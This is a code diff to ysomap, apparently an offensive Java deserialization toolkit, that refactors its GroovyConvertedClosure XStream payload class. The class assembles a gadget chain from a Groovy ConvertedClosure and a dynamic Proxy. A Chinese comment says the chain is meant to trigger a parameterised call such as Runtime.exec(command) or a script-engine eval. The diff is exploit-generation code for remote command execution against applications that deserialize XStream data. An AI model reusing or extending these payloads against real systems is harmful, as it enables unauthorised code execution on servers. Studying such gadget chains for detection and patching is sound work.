@@ -6,6 +6,7 @@ import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.bullets.groovy.ClosureWithRuntimeBullet;
 import ysomap.core.util.PayloadHelper;
+import ysomap.core.util.ReflectionHelper;
 
 import java.lang.reflect.Proxy;
 
@@ -23,14 +24,14 @@ public class GroovyConvertedClosure extends XStreamPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return new ClosureWithRuntimeBullet().set("command",args[0]);
+        return ClosureWithRuntimeBullet.newInstance(args);
     }
 
     @Override
     public Object pack(Object obj) throws Exception {
         // 这条利用链 需要配合存在参数的函数调用，比如Runtime.exec(command)
         // 也可以扩展js引擎eval那种
-        Object command = bullet.get("command");
+        Object command = ReflectionHelper.get(bullet, "command");
         ConvertedClosure handler = new ConvertedClosure((Closure) obj, "compareTo");
         Object map = Proxy.newProxyInstance(
                 GroovyConvertedClosure.class.getClassLoader(),
